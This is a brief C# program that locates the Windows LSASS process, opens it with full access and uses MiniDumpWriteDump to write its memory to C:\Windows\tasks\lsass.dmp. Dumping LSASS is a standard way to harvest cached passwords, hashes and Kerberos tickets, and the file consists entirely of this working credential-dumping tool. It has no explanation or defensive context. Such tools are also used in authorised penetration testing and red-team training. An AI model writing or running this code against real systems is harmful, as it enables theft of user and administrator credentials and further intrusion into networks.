using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace MiniDumpWriteDump
{
    class Program
    {
        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,
          IntPtr hFile, int DumpType, IntPtr ExceptionParam,
          IntPtr UserStreamParam, IntPtr CallbackParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,
          int processId);

        static void Main(string[] args)
        {
            
            Process[] lsass = Process.GetProcessesByName("lsass");
            int lsass_pid = lsass[0].Id;
            Console.Write("LSASS.exe process found: " + lsass_pid);

            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid);
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
            var dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
